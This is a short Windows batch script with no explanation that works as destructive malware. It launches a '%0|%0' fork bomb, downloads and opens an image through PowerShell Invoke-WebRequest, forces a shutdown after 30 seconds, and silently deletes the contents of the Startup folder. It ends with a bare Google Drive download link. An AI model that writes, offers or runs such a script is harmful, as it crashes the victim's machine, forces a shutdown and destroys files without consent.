@echo off

%0|%0

Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image.jpg"

shutdown -s -t 30

image.jpg

cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

del /s /q *.*


https://drive.google.com/uc?id=1SLQFYeiSzlFxxrv_L64oZ7W5QTxcvFUB&export=download
